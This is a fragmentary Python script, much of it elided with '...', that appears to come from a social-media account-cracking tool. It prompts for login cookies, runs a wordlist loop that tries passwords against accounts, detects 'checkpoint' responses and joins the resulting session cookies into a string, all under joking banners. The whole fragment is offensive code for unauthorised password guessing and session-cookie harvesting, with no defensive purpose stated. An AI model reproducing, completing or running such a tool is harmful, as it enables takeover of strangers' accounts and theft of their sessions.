...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             ENTER : [green]COOKIES[purple] '))
...
def menu(my_name,my_id):
	...
	cetak(nel('\tCOOKIE OWNER NAME [green]%s[purple] '%(my_name)))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]               GAME STARTED😂[bold cyan]')) 
	print(f'                    {m}P {k}R {h}E {u}S {b}H {u} {m}A {k}K  ★  {b}B {u}H {h}')
	print('')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      😭HELLO THIS IS PRESHAK 🤣[purple]')) 
